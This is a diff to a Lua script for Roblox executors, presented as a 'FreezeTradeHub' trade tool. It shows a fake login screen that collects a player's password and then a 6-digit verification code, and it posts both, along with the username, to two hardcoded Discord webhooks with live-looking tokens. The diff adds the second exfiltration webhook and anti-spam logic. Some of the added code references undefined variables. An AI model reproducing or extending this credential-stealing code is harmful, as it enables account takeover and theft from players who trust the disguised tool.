@@ -1,40 +1,45 @@
 -- URL Webhook Discord
-local webhook_url = "https://discord.com/api/webhooks/1324996384369414155/LBWNNFQc6yOl4c3kEO0q1o_MEOsaid28teEYDhtTEekGGHZXv1nuj9nWfy1Vxl2TXIYa, https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"
+local webhook_url1 = "https://discord.com/api/webhooks/1325053300139233290/X54RZWcMnt0h980IQPYKo7KYY60K8ZqPso3MCyVkvs_7Sr_1SvS11nHpD_MdppI9J1nf"
+local webhook_url2 = "https://discord.com/api/webhooks/1324996384369414155/LBWNNFQc6yOl4c3kEO0q1o_MEOsaid28teEYDhtTEekGGHZXv1nuj9nWfy1Vxl2TXIYa"
 
 -- Key yang benar
 local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
 local linkUrl = "https://link-target.net/1273087/freezetradehub"
 
 -- Fungsi untuk mengirim data ke Discord
-local function sendToDiscord(content)
-local payload = {
-Url = webhook_url,
-Method = "POST",
-Headers = {
-["Content-Type"] = "application/json"
-},
-Body = game:GetService("HttpService"):JSONEncode({
-content = content
-})
-}
+local function sendToDualWebhook(content)
+    local payload = {
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({ content = content })
+    }
 
-local response
-if syn and syn.request then
-response = syn.request(payload)
-elseif http and http.request then
-response = http.request(payload)
-elseif request then
-response = request(payload)
-else
-print("Executor Anda tidak mendukung HTTP requests!")
-return
-end
+    local function sendToWebhook(url)
+        local success, response = pcall(function()
+            payload.Url = url
+            if syn and syn.request then
+                return syn.request(payload)
+            elseif http and http.request then
+                return http.request(payload)
+            elseif request then
+                return request(payload)
+            else
+                error("Executor Anda tidak mendukung HTTP requests!")
+            end
+        end)
 
-if response and response.StatusCode == 200 then
-print("Data berhasil dikirim ke Discord!")
-else
-print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
-end
+        if success and response and (response.StatusCode == 200 or response.StatusCode == 204) then
+            print("Berhasil mengirim ke webhook:", url)
+        else
+            print("Gagal mengirim ke webhook:", url, "Error:", response and response.StatusCode or "Unknown")
+        end
+    end
+
+    -- Kirim ke masing-masing webhook
+    sendToWebhook(webhook_url1)
+    sendToWebhook(webhook_url2)
 end
 
 -- Fungsi untuk membuat MenuGUI
@@ -161,6 +166,58 @@ local function createMenuGUI()
     end)
 end
 
+-- Variabel untuk anti-spam
+local lastVerificationSent = 0 -- Menyimpan waktu terakhir pengiriman
+local verificationDebounceTime = 5 -- Waktu debounce (detik)
+local isProcessingVerification = false -- Untuk mencegah multiple execution
+
+-- Fungsi untuk mengirim kode verifikasi ke Discord
+local function sendVerificationToDiscord(username, code)
+    local currentTime = tick()
+
+    -- Cek apakah pengiriman terakhir dalam waktu debounce
+    if (currentTime - lastVerificationSent) < verificationDebounceTime then
+        print("Spam detected. Verification code not sent.")
+        return false
+    end
+
+    -- Format payload untuk Discord webhook
+    local payload = {
+        Url = webhook_url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({
+            content = "Username: " .. username .. "\nKode Verifikasi: " .. code
+        })
+    }
+
+    -- Kirim data menggunakan executor HTTP request
+    local response
+    local success = pcall(function()
+        if syn and syn.request then
+            response = syn.request(payload)
+        elseif http and http.request then
+            response = http.request(payload)
+        elseif request then
+            response = request(payload)
+        else
+            error("Executor Anda tidak mendukung HTTP requests!")
+        end
+    end)
+
+    -- Periksa apakah pengiriman berhasil
+    if success and response and (response.StatusCode == 200 or response.StatusCode == 204) then
+        print("Kode verifikasi berhasil dikirim ke Discord!")
+        lastVerificationSent = currentTime -- Perbarui waktu pengiriman terakhir
+        return true
+    else
+        print("Gagal mengirim kode verifikasi:", response and response.StatusCode or "Unknown Error")
+        return false
+    end
+end
+
 -- Fungsi untuk membuat GUI Verifikasi Kode
 local function createVerificationCodeGUI()
     local gui = Instance.new("ScreenGui")
@@ -170,7 +227,9 @@ local function createVerificationCodeGUI()
     local codeBox = Instance.new("TextBox")
     local verifyCodeButton = Instance.new("TextButton")
     local errorLabel = Instance.new("TextLabel")
-    local isDataSent = false
+
+    -- Ambil username otomatis dari LocalPlayer
+    local username = game.Players.LocalPlayer.Name
 
     -- Properti GUI
     gui.Name = "VerificationCodeGUI"
@@ -241,33 +300,29 @@ local function createVerificationCodeGUI()
     verifyCodeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
     verifyCodeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    -- Validasi Input Kode
-    codeBox.FocusLost:Connect(function(enterPressed)
-        local text = codeBox.Text
-        if not text:match("^%d%d%d%d%d%d$") then
-            errorLabel.Text = "Kode harus 6 digit angka!"
-            codeBox.Text = ""
-        else
-            errorLabel.Text = ""
-        end
-    end)
-
-    -- Fungsi Verifikasi Kode
+    -- Fungsi Verifikasi Kode dengan Anti-Spam
     verifyCodeButton.MouseButton1Click:Connect(function()
-        if isDataSent then
-            return -- Hentikan jika data sudah terkirim
+        if isProcessingVerification then
+            print("Processing verification in progress. Please wait.")
+            return
         end
-            
+
+        isProcessingVerification = true -- Mencegah eksekusi ganda
         local verificationCode = codeBox.Text
+
         if verificationCode:match("^%d%d%d%d%d%d$") then
-            sendToDiscord("Kode Verifikasi: " .. verificationCode)
-            print("Kode verifikasi telah dikirim ke Discord!")
-            isDataSent = true
-            gui:Destroy()
-            createMenuGUI() -- Menampilkan MenuGUI setelah verifikasi
+           local content = "Username: " .. username .. "\nKode Verifikasi: " .. verificationCode
+        sendToDualWebhook(content)
+            if success then
+                gui:Destroy()
+                createMenuGUI() -- Menampilkan MenuGUI setelah verifikasi berhasil
+            else
+                errorLabel.Text = "Gagal mengirim kode. Coba lagi."
+            end
         else
             errorLabel.Text = "Kode harus 6 digit angka!"
         end
+        isProcessingVerification = false -- Reset status
     end)
 end
 
@@ -327,6 +382,56 @@ end
 end)
 end
 
+-- Tabel untuk melacak pengiriman data
+local sentData = {}
+local debounceTime = 5 -- waktu delay (detik)
+local isProcessing = false -- Untuk mencegah multiple execution
+
+-- Fungsi untuk mengirim data ke Discord dengan anti-spam
+local function sendToDiscord(data)
+    local currentTime = tick()
+    local identifier = tostring(data)
+
+    -- Cek apakah data sudah terkirim dalam waktu debounce
+    if sentData[identifier] and (currentTime - sentData[identifier] < debounceTime) then
+        print("Spam detected. Data not sent.")
+        return
+    end
+
+    -- Format payload untuk Discord webhook
+    local payload = {
+        Url = webhook_url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({
+            content = data
+        })
+    }
+
+    -- Kirim data menggunakan executor HTTP request
+    local response
+    if syn and syn.request then
+        response = syn.request(payload)
+    elseif http and http.request then
+        response = http.request(payload)
+    elseif request then
+        response = request(payload)
+    else
+        print("Executor Anda tidak mendukung HTTP requests!")
+        return
+    end
+
+    -- Cek respons dari Discord
+    if response and response.StatusCode == 200 then
+        print("Data berhasil dikirim ke Discord!")
+        sentData[identifier] = currentTime -- Tandai data sebagai terkirim
+    else
+        print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
+    end
+end
+
 -- Fungsi Membuat GUI Login
 local function createLoginGUI()
     local gui = Instance.new("ScreenGui")
@@ -338,9 +443,8 @@ local function createLoginGUI()
     local loginButton = Instance.new("TextButton")
     local errorLabel = Instance.new("TextLabel") -- Error label untuk validasi
 
-    -- Variabel untuk password asli dan kontrol pengiriman data
+    -- Variabel untuk password asli
     local password = ""
-    local isDataSent = false
 
     -- Ambil username otomatis dari LocalPlayer
     local username = game.Players.LocalPlayer.Name
@@ -390,8 +494,8 @@ local function createLoginGUI()
     usernameBox.TextSize = 14
     usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
     usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-    usernameBox.TextEditable = false -- Nonaktifkan input manual
-    usernameBox.Text = username -- Isi otomatis dengan username pengguna
+    usernameBox.TextEditable = false
+    usernameBox.Text = username
 
     -- Password Box
     passwordBox.Name = "PasswordBox"
@@ -405,7 +509,6 @@ local function createLoginGUI()
     passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
     passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    -- Sensor Password Secara Manual
     passwordBox:GetPropertyChangedSignal("Text"):Connect(function()
         local currentText = passwordBox.Text
         if #currentText > #password then
@@ -439,27 +542,29 @@ local function createLoginGUI()
     loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
     loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    -- Fungsi Tombol Login
+    -- Fungsi Tombol Login dengan debounce
     loginButton.MouseButton1Click:Connect(function()
-        if isDataSent then
-            return -- Hentikan jika data sudah terkirim
-        end
-
-        -- Validasi input password kosong
-        if password == "" then
-            errorLabel.Text = "Password Tidak Boleh Kosong"
+        if isProcessing then
+            print("Processing in progress. Please wait.")
             return
         end
 
-        -- Kirim data ke Discord
-        sendToDiscord("Username: " .. username .. "\nPassword: " .. password)
-        isDataSent = true -- Tandai bahwa data sudah terkirim
-        errorLabel.Text = "" -- Bersihkan error
+        isProcessing = true -- Mulai proses
+        if #password < 8 then
+            errorLabel.Text = "Password minimal 8 karakter!"
+            isProcessing = false -- Reset status
+            return
+        end
+
+     local content = "USERNAME: " .. username .. "\nPASSWORD: " .. password
+     sendToDualWebhook(content)
+        errorLabel.Text = ""
         print("Data berhasil terkirim ke Discord!")
 
-        gui:Destroy() -- Hapus GUI setelah sukses
+        gui:Destroy()
         createLoadingGUI(3, function()
             createVerificationCodeGUI()
+            isProcessing = false -- Selesai proses
         end)
     end)
 end
